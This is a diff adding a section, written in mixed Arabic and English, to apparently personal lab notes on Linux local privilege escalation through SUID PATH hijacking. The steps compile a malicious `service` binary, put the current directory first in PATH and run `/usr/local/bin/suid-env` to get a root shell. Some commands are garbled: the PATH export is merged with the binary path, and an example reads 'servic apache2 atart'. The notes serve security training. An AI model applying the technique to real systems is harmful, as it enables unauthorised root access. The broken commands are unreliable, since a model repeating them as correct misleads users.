@@ -503,6 +503,35 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 * <details>
      <summary>Environment Variables</summary>
+
+
+   # SUID/SGID Executable - Environment Variables
+
+   ### 10) SUID/SGID executable - Environment variables
+
+   * ضمن الملفات التي وجدناها تحمل صلاحيات SUID/SGID وجدنا الملف: `/usr/local/bin/suid-env`
+   * عند تشغيل الملف هنلاحظ إنه سيحاول تشغيل Apache2 بس من غير ما يتحددله مسار كامل لتشغيل هذه الخدمة
+   * بـ `service apache2 start` (مسار غير كامل).
+     * ده مثال للمسار الكامل ``/usr/sbin/servic apache2 atart``
+
+   * `strings /usr/local/bin/suid-env`
+       * This shows the program calls `service apache2 start`.
+
+   * `gcc -o service /home/user/tools/service.c`
+       * هنعمل ملف باسم `service` فيه كود خبيث مثل الأكواد الخبيثة السابقة ونستخدم `gcc` لإنشاء ملف تنفيذي.
+
+   * `export PATH=.:$PATH/usr/local/bin/suid-env`
+       * ولابد أن يبحث النظام في المسار الحالي (`.`) قبل المسارات الأخرى.
+          * المسار الحالى ``/home/user``
+
+   * Now run the SUID executable: `/usr/local/bin/suid-env`
+       * It will execute your malicious `./service` file instead of the system's `service` command.
+
+   * `whoami`
+       * `root`
+
+
+
   </details>
 
 
